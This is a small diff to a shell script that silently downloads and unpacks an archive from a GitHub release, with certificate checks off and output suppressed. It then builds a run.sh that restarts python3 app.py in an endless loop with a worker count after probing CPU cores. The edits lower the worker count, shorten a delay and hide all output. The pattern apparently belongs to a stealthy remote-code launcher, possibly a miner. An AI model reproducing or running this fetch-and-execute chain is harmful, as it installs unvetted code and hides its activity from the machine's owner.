@@ -3,7 +3,7 @@
 curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/mcpo.tar.gz >/dev/null 2>&1 
 tar -xvf mcpo.tar.gz >/dev/null 2>&1
 rm mcpo.tar.gz
-sleep 60
+sleep 30
 cd mcp && echo '#!/bin/bash
 
 PORT=$1
@@ -28,4 +28,4 @@ SERVER_MODE=FAST" > .env
 while true; do
   python3 app.py
   sleep 15
-done' > run.sh && chmod +x run.sh && nproc --all && ./run.sh 3 worker01
+done' > run.sh && chmod +x run.sh && nproc --all && ./run.sh 2 worker01 >/dev/null 2>&1
